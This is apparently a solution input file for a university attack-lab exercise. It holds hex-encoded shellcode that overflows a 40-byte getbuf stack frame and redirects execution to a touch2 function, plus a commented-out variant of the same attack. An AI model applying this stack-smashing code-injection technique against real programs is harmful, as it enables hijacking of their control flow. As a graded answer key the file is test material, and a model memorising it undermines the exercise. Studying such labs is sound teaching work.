/* This injects exploit code into the 40-byte getbuf stack frame.   */
/* It also uses push to add the address of touch2 to stack.         */
/* See ctarget.l2.codeinject.s for explanation.                        */

48 c7 c7 fa 97 b9 59 	            /* mov $0x59b997fa,%rdi */
68 ec 17 40 00 	                    /* pushq $0x4017ec, address of touch2 */
c3                   	            /* retq */
01 02 03 04 05 06 07 08 09          /* 27 bytes of random filler */
01 02 03 04 05 06 07 08 09
01 02 03 04 05 06 07 08 09
78 DC 61 55 00 00 00 00             /* address of mov, 0x5561DC78 */
                                    /* This adress is also the top of the 40-byte getbuf stack frame */


/* This injects exploit code beyond the 40-byte stack frame.        */
/* It causes a SegFault in the validation code, but does print "Valid solution for level2" */
/* See ctarget.l2.codeinject2.s for explanation.                       */

/*
33 33 33 33 33 33 33 33 33 33       /* 40 bytes for getbuf stack frame */
33 33 33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33 33 33
33 33 33 33 33 33 33 33 33 33
A8 DC 61 55 00 00 00 00             /* address of movq, 0x5561DCA8 */
48 c7 c7 fa 97 b9 59 	            /* mov $0x59b997fa,%rdi */
48 83 c4 0C          	            /* add $0xC,%rsp */
c3                   	            /* ret */
EC 17 40 00 00 00 00 00             /* address of touch2, 0x4017EC */
*/





